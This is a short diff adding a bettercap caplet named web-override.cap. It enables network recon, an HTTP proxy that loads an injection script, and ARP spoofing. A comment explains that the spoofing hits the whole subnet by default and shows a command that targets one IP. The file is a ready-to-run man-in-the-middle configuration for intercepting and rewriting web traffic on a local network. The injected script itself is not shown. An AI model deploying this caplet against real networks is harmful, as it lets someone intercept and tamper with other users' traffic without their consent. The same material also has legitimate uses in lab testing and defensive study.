@@ -1,0 +1,15 @@
+# targeting the whole subnet by default, to make it selective:
+#
+#   sudo ./bettercap-ng -caplet caplets/web-override.cap -eval "set arp.spoof.targets 192.168.1.64"
+
+set http.proxy.script caplets/web-override.js
+net.recon on
+http.proxy on
+arp.spoof on
+events.clear
+
+
+
+
+
+
